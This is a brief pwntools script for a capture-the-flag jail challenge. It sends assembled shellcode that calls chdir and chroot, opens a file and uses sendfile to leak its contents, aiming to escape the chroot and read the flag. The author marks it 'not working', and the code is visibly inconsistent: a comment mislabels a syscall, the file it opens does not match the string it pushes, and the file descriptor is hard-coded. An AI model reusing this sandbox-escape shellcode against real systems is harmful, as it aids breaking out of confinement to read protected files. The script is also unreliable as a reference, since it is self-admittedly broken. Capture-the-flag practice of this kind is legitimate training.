import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# chdir -> 80
# chroot -> 161
# mkdir -> 83
# open -> 2
# read -> 0
# write -> 1
# send file -> 40


# / -> /tmp/jail/
# (jailed)
# new folder /a
# chroot(/a) -> turns / -> /tmp/jail/a
# now chroot corresponds to /tmp/jail/a NOT /tmp/jail


with pwn.process(["strace", "/challenge/babyjail_level7", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""
    //int chroot(const char *path);
    {pwn.shellcraft.chdir("/newPath")}
    //int chroot(const char *path);
    {pwn.shellcraft.chroot("/newPath")}
    
    {pwn.shellcraft.pushstr("flag")}
    mov rsi, rsp


    {pwn.shellcraft.open("/abc", 0)}

    {pwn.shellcraft.sendfile(1, 4, 0, 1024)}
    """))

    pwn.info(target.readrepeat(1))



# not working
